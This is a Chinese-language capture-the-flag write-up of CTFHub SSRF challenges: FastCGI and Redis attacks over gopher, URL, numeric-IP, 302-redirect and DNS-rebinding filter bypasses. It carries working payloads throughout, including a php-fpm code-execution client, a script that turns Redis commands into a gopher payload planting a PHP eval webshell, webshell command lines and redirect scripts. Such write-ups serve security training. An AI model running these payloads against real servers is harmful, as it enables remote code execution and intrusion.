%70%72%65%70%65%6e%64%5f%66%69%6c%65%25%32%30%25%33%44%25%32%30%70%68%70%25%33%41%2f%2f%69%6e%70%75%74%25%30%46%25%31%37%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%69%6e%64%65%78%2e%70%68%70%25%30%44%25%30%31%44%4f%43%55%4d%45%4e%54%5f%52%4f%4f%54%2f%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%35%25%30%30%25%30%31%25%30%30%25%35%45%25%30%34%25%30%30%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%37%63%61%74%25%32%30%2f%66%6c%61%67%5f%30%61%62%31%31%37%61%65%33%63%34%30%33%32%37%34%62%31%32%35%35%35%62%66%33%30%37%36%38%63%65%32%25%32%37%25%32%39%25%33%42%64%69%65%25%32%38%25%32%37%2d%2d%2d%2d%2d%4d%61%64%65%2d%62%79%2d%53%70%79%44%33%72%2d%2d%2d%2d%2d%25%30%41%25%32%37%25%32%39%25%33%42%25%33%46%25%33%45%25%30%30%25%30%30%25%30%30%25%30%30
```

![image-20251016214019047](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240501633.png)



##### flag

```
ctfhub{b005844b0b7f6a37752d9e29}
```



接下来是另一种方法：

这道题坑有点多，主要有几点：

- 题目附件中的exp是使用fastcgi协议发送报文的，是直接向php-fpm（9000端口）发送的，外网不能访问到该端口，不能直接拿来打题目url

  - 所以要自己手动获取fastcgi发送的报文，然后利用gopher进行内网访问9000端口的fpm

- 需要使用hex编码来构造payload，而hexdump在x86环境下是小端显示（就是地址位低的字节在前）

- hex编码后的payload需要转换位url编码，然后再次url编码（一共两次url编码）

- 步骤

  - 监听端口（可以不用9000，可以随意更换，但是在下面的exp里也要修改对应端口），使用hexdump的大端显示模式，把结果存到`1.txt`

    - `nc -lvvp 9000 | hexdump -C > 1.txt`

  - 执行exp

    - `python exp.py -c "<?php var_dump(system('ls /')); ?>" -p 9000 0.0.0.0 /var/www/html/index.php`

    - 用法`python exp.py -c php代码 -p php-fpm端口 ip 任意php文件的绝对路径`

    - 这里我们是要自己向自己的端口访问，来获取请求报文，所以端口可以任意设置

    - exp脚本（来自https://github.com/wuyunfeng/Python-FastCGI-Client）

      ```python
      import socket
      import random
      import argparse
      import sys
      from io import BytesIO
      
      # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
      
      PY2 = True if sys.version_info.major == 2 else False
      
      
      def bchr(i):
          if PY2:
              return force_bytes(chr(i))
          else:
              return bytes([i])
      
      def bord(c):
          if isinstance(c, int):
              return c
          else:
              return ord(c)
      
      def force_bytes(s):
          if isinstance(s, bytes):
              return s
          else:
              return s.encode('utf-8', 'strict')
      
      def force_text(s):
          if issubclass(type(s), str):
              return s
          if isinstance(s, bytes):
              s = str(s, 'utf-8', 'strict')
          else:
              s = str(s)
          return s
      
      
      class FastCGIClient:
          """A Fast-CGI Client for Python"""
      
          # private
          __FCGI_VERSION = 1
      
          __FCGI_ROLE_RESPONDER = 1
          __FCGI_ROLE_AUTHORIZER = 2
          __FCGI_ROLE_FILTER = 3
      
          __FCGI_TYPE_BEGIN = 1
          __FCGI_TYPE_ABORT = 2
          __FCGI_TYPE_END = 3
          __FCGI_TYPE_PARAMS = 4
          __FCGI_TYPE_STDIN = 5
          __FCGI_TYPE_STDOUT = 6
          __FCGI_TYPE_STDERR = 7
          __FCGI_TYPE_DATA = 8
          __FCGI_TYPE_GETVALUES = 9
          __FCGI_TYPE_GETVALUES_RESULT = 10
          __FCGI_TYPE_UNKOWNTYPE = 11
      
          __FCGI_HEADER_SIZE = 8
      
          # request state
          FCGI_STATE_SEND = 1
          FCGI_STATE_ERROR = 2
          FCGI_STATE_SUCCESS = 3
      
          def __init__(self, host, port, timeout, keepalive):
              self.host = host
              self.port = port
              self.timeout = timeout
              if keepalive:
                  self.keepalive = 1
              else:
                  self.keepalive = 0
              self.sock = None
              self.requests = dict()
      
          def __connect(self):
              self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              self.sock.settimeout(self.timeout)
              self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
              # if self.keepalive:
              #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
              # else:
              #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
              try:
                  self.sock.connect((self.host, int(self.port)))
              except socket.error as msg:
                  self.sock.close()
                  self.sock = None
                  print(repr(msg))
                  return False
              return True
      
          def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
              length = len(content)
              buf = bchr(FastCGIClient.__FCGI_VERSION) \
                     + bchr(fcgi_type) \
                     + bchr((requestid >> 8) & 0xFF) \
                     + bchr(requestid & 0xFF) \
                     + bchr((length >> 8) & 0xFF) \
                     + bchr(length & 0xFF) \
                     + bchr(0) \
                     + bchr(0) \
                     + content
              return buf
      
          def __encodeNameValueParams(self, name, value):
              nLen = len(name)
              vLen = len(value)
              record = b''
              if nLen < 128:
                  record += bchr(nLen)
              else:
                  record += bchr((nLen >> 24) | 0x80) \
                            + bchr((nLen >> 16) & 0xFF) \
                            + bchr((nLen >> 8) & 0xFF) \
                            + bchr(nLen & 0xFF)
              if vLen < 128:
                  record += bchr(vLen)
              else:
                  record += bchr((vLen >> 24) | 0x80) \
                            + bchr((vLen >> 16) & 0xFF) \
                            + bchr((vLen >> 8) & 0xFF) \
                            + bchr(vLen & 0xFF)
              return record + name + value
      
          def __decodeFastCGIHeader(self, stream):
              header = dict()
              header['version'] = bord(stream[0])
              header['type'] = bord(stream[1])
              header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
              header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
              header['paddingLength'] = bord(stream[6])
              header['reserved'] = bord(stream[7])
              return header
      
          def __decodeFastCGIRecord(self, buffer):
              header = buffer.read(int(self.__FCGI_HEADER_SIZE))
      
              if not header:
                  return False
              else:
                  record = self.__decodeFastCGIHeader(header)
                  record['content'] = b''
      
                  if 'contentLength' in record.keys():
                      contentLength = int(record['contentLength'])
                      record['content'] += buffer.read(contentLength)
                  if 'paddingLength' in record.keys():
                      skiped = buffer.read(int(record['paddingLength']))
                  return record
      
          def request(self, nameValuePairs={}, post=''):
              if not self.__connect():
                  print('connect failure! please check your fasctcgi-server !!')
                  return
      
              requestId = random.randint(1, (1 << 16) - 1)
              self.requests[requestId] = dict()
              request = b""
              beginFCGIRecordContent = bchr(0) \
                                       + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                       + bchr(self.keepalive) \
                                       + bchr(0) * 5
              request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                                    beginFCGIRecordContent, requestId)
              paramsRecord = b''
              if nameValuePairs:
                  for (name, value) in nameValuePairs.items():
                      name = force_bytes(name)
                      value = force_bytes(value)
                      paramsRecord += self.__encodeNameValueParams(name, value)
      
              if paramsRecord:
                  request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
              request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)
      
              if post:
                  request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
              request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
      
              self.sock.send(request)
              self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
              self.requests[requestId]['response'] = b''
              return self.__waitForResponse(requestId)
      
          def __waitForResponse(self, requestId):
              data = b''
              while True:
                  buf = self.sock.recv(512)
                  if not len(buf):
                      break
                  data += buf
      
              data = BytesIO(data)
              while True:
                  response = self.__decodeFastCGIRecord(data)
                  if not response:
                      break
                  if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                          or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                      if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                          self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                      if requestId == int(response['requestId']):
                          self.requests[requestId]['response'] += response['content']
                  if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                      self.requests[requestId]
              return self.requests[requestId]['response']
      
          def __repr__(self):
              return "fastcgi connect host:{} port:{}".format(self.host, self.port)
      
      
      if __name__ == '__main__':
          parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
          parser.add_argument('host', help='Target host, such as 127.0.0.1')
          parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
          parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')
          parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)
      
          args = parser.parse_args()
      
          client = FastCGIClient(args.host, args.port, 3, 0)
          params = dict()
          documentRoot = "/"
          uri = args.file
          content = args.code
          params = {
              'GATEWAY_INTERFACE': 'FastCGI/1.0',
              'REQUEST_METHOD': 'POST',
              'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
              'SCRIPT_NAME': uri,
              'QUERY_STRING': '',
              'REQUEST_URI': uri,
              'DOCUMENT_ROOT': documentRoot,
              'SERVER_SOFTWARE': 'php/fcgiclient',
              'REMOTE_ADDR': '127.0.0.1',
              'REMOTE_PORT': '9985',
              'SERVER_ADDR': '127.0.0.1',
              'SERVER_PORT': '80',
              'SERVER_NAME': "localhost",
              'SERVER_PROTOCOL': 'HTTP/1.1',
              'CONTENT_TYPE': 'application/text',
              'CONTENT_LENGTH': "%d" % len(content),
              'PHP_VALUE': 'auto_prepend_file = php://input',
              'PHP_ADMIN_VALUE': 'allow_url_include = On'
          }
          response = client.request(params, content)
      ```

  - 处理请求报文

    - 我在参考里的脚本上添加了一些处理的代码，来过滤`hexdump -C`的对照信息，然后转换成url编码格式

      ```python
      import urllib
      
      # 打开报文
      file = open("/home/kali/1.txt","r")
      content = file.readlines()
      # 读取报文，去除对照信息
      str_ = ""
      for line in content:
          str_ += line[8:-20]
      # 去除空格和换行符
      str_dealed = str_.replace("\n", "").replace(" ", "")
      # 转换为url编码形式
      payload = ""
      length = len(str_dealed)
      for i in range(0, length, 2):
          temp = "%" + str_dealed[i] + str_dealed[i+1]
          payload += temp
      # 再次url编码
      print(urllib.quote(payload))
      ```

  - 拼接payload

    - `http://challenge-id.sandbox.ctfhub.com:10080/?url=gopher://127.0.0.1:9000/_payload`







## Redis协议

#### 题目内容

**这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!**

![image-20251016203716516](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240501447.png)





#### 解题过程

访问

```
?url=file:///var/www/html/index.php
```

![image-20251016203932162](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502171.png)

这道题和上道题方法类似，都是利用gopher来构造特定协议内容，直接和应用通信，这道题用的是Redis的RESP协议

 关于RESP和其他详细分析，可以参考[这篇文章](https://xz.aliyun.com/t/5665#toc-0)

利用Redis命令来写webshell

```
flushall
set 1 '<?php eval($_GET["cmd"]);?>'
config set dir /var/www/html
config set dbfilename shell.php
save
```

利用脚本转换为gopher的payload

```python
import urllib
from urllib import parse

protocol = "gopher://"
ip = "127.0.0.1"
port = "6379"
shell = "\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
filename = "shell.php"
path = "/var/www/html"
passwd = ""
cmd = ["flushall",
       "set 1 {}".format(shell.replace(" ", "${IFS}")),
       "config set dir {}".format(path),
       "config set dbfilename {}".format(filename),
       "save"
       ]
if passwd:
    cmd.insert(0, "AUTH {}".format(passwd))
payload_prefix = protocol + ip + ":" + port + "/_"
CRLF = "\r\n"


def redis_format(arr):
    redis_arr = arr.split(" ")
    cmd_ = ""
    cmd_ += "*" + str(len(redis_arr))
    for x_ in redis_arr:
        cmd_ += CRLF + "$" + str(len((x_.replace("${IFS}", " ")))) + CRLF + x_.replace("${IFS}", " ")
    cmd_ += CRLF
    return cmd_


if __name__ == "__main__":
    payload = ""
    for x in cmd:
        payload += parse.quote(redis_format(x))  # url编码
    payload = payload_prefix + parse.quote(payload)  # 再次url编码
    print(payload)
```

得到内容

```
gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

执行成功后访问

```
/shell.php
```

![image-20251016204436274](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502110.png)

后面就是执行命令了

```
/shell.php?cmd=system('ls /');
/shell.php?cmd=system('cat /flag_c7143e092ca0f5dcd20ef751d24b6efe');
```

![image-20251016204631957](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502430.png)

![image-20251016204733963](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502336.png)

##### flag

```
ctfhub{f304853c1f50b9df14f122f8}
```



其实这里属于是**Redis未授权访问攻击**，也是非常重要的一个漏洞，有兴趣的可以上网了解一下



## URL Bypass

#### 题目内容

**请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧**

![image-20251016204955775](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502258.png)



#### 解题过程

![image-20251016205141201](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502179.png)

URL必须以http://notfound.ctfhub.com开始

![image-20251016205220171](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502644.png)

之前有过xss的bypass经验，应该有了解到两个方法：

- 利用`xip.io`（可以直接访问该域名）

  - 访问`www.xxx.com.1.1.1.1.xip.io`，会解析为1.1.1.1
  - 尝试发现，`xip.io`被ban了

- 尝试`nip.io`

  - 可以使用

  ![image-20251016205258527](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502366.png)

  - payload：`?url=http://notfound.ctfhub.com.127.0.0.1.nip.io/flag.php`

- 使用HTTP基础认证

  - payload：`?url=http://notfound.ctfhub.com@127.0.0.1/flag.php`

  ![image-20251016205329251](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502181.png)



## 数字IP Bypass

#### 题目内容

**这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢**

![image-20251016205352699](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502736.png)



#### 解题过程

访问

```
?url=http://127.0.0.1
```

![image-20251016205508525](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240502608.png)

提示ban掉了`127 172 @`

只需要将IP转换为int数字就行了

这里我使用的工具是[IP/数字互转 iP138在线工具](https://tool.ip138.com/iptoint/)

![image-20251016205630423](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503176.png)

```
?url=http://2130706433/flag.php
```

![image-20251016205655205](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503799.png)

##### flag

```
ctfhub{7b8b2622d90e17d4e424cda5}
```



## 302跳转 Bypass

#### 题目内容

**SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧**

![image-20251016205837372](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503400.png)



#### 解题过程

访问

```
?url=http://127.0.0.1
```

![image-20251016210013684](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503691.png)

提示禁止访问局域网ip

使用file协议尝试读一下文件

![image-20251016210202076](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503266.png)

与之前一样，通过`REMOTE_ADDR`请求头限制本地IP请求，源码中并没有之前的**hacker! Ban Intranet IP**，所以查看`index.php`页面的源码：`?url=file:///var/www/html/index.php`
得到`index.php`页面源码：

![image-20251016210244927](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503034.png)

其中存在黑名单，限制了`127`、`172`、`10`、`192`网段，其实可以通过`localhost`的方式绕过，即`?url=localhost/flag.php`

![image-20251016210351455](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503591.png)

也可以得到`flag`，这应该是个非预期

但题目提示使用302跳转方式，尝试将`http://127.0.0.1/flag.php`转换为短网址[短网址 - URLC.CN短网址,短网址生成,网址缩短,免费提供API接口生成,活码二维码生成,域名拦截检测](https://www.urlc.cn/)

![image-20251016210528432](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503198.png)

也是可行的

![image-20251016210517572](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503021.png)

但是这里的正确做法应该是把跳转的脚本上传到vps上，然后访问vps上的脚本，跳转回去即可

```
<?php
if(isset($_GET['url'])){
    header("Location: {$_GET['url']}");
    exit;
}
?>
```

```
?url=http://IP:PORT/302.php?url=http://127.0.0.1/flag.php
```

因为要开启php服务，这里就不演示了



##### flag

```
ctfhub{0f4f71d65265e5c9f8cad501}
```



## DNS重绑定 Bypass

#### 题目内容

**关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助**

![image-20251016210802970](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503971.png)



#### 解题过程

访问`?url=http://127.0.0.1`，提示禁止访问局域网ip

![image-20251016210956558](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503353.png)

题目是DNS重绑定，相关资料：https://www.freebuf.com/articles/web/135342.html

> 对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤：
>
> [![img](https://image.3001.net/images/20170515/14948315084608.png!small)](https://image.3001.net/images/20170515/14948315084608.png!small)
>
> 对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。
>
> 但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。
>
> 要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：
>
> > (1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
> >
> > (2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证
> >
> > (3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
> >
> > (4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。

推荐一个很详细的资料：[关于DNS-rebinding的总结](http://www.bendawang.site/2017/05/31/关于DNS-rebinding的总结/)

需要有域名和vps，然后根据总结里的方法，就可以完成

但是这里考虑到不是所有人都有vps和域名

使用以下方法：

用我的理解来说就是，用户访问一个特定的域名，然后这个域名原来是一个正常的ip。但是当域名持有者修改域名对应的ip后，用户再访问这个域名的时候，浏览器以为你一直访问的是一个域名，就会认为很安全。这个是DNS重绑定攻击

这里可以让用户访问一个域名，然后这个域名在访问127.0.0.1

这里我使用一个大佬的网站来实现以上操作

```
https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg
```

DNS重绑定并没有违反同源策略，相当于是钻了同源策略，同域名同端口访问的空子了。

这里的操作十分的简单

首先先打开那个网站，然后设置为下

![image-20251016211244867](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240503818.png)

然后访问

```
?url=7f000001.c0a80001.rbndr.us/flag.php
```

![image-20251016211300189](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240504514.png)

##### flag

```
ctfhub{c6d3b9c8ed63b11fee5a3b66}
```

